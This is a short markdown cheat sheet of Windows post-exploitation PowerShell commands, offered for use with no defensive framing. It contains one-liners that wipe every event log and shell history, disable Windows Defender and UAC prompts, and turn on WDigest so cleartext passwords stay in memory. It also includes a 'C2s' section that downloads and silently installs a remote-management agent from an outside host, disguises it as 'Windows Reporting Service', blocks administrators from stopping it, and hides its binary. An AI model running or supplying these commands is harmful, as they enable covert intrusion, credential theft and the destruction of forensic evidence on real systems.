## Windows

### Leave No Trace

```powershell
# Clear Event Logs
Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }; Remove-Item (Get-PSReadlineOption).HistorySavePath -Force; Set-PSReadlineOption -HistorySaveStyle SaveNothing; Clear-History; Clear-History; [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"); [System.Windows.Forms.SendKeys]::Sendwait('%{F7 2}'); Remove-Item (Get-PSReadlineOption).HistorySavePath
```

### Disable Security

```powershell
Set-MpPreference -DisableRealtimeMonitoring 1; Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1; Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
```

### Password Logger

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1; gpupdate /force
```

### C2s

#### Tactical 

```powershell
# Install 
$URL = "https://srv-api.example.com/clients/05afb6f8-9257-4df2-900c-9abc3585dd40/deploy/"; Invoke-WebRequest $URL -OutFile ( New-Item -Path "c:\ProgramData\TacticalRMM\temp\trmminstall.exe" -Force ); $proc = Start-Process c:\ProgramData\TacticalRMM\temp\trmminstall.exe -ArgumentList '-silent' -PassThru; Wait-Process -InputObject $proc; if ($proc.ExitCode -ne 0) {Write-Warning "$_ exited with status code $($proc.ExitCode)"}; Remove-Item -Path "c:\ProgramData\TacticalRMM\temp\trmminstall.exe" -Force; $SERVICE_NAME = "tacticalrmm"; $NEW_DISPLAY_NAME = "Windows Reporting Service"; sc.exe config $SERVICE_NAME displayname="$NEW_DISPLAY_NAME"; & $env:SystemRoot\System32\sc.exe sdset $SERVICE_NAME "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"; attrib +s +h "C:\Program Files\TacticalAgent\tacticalrmm.exe"
```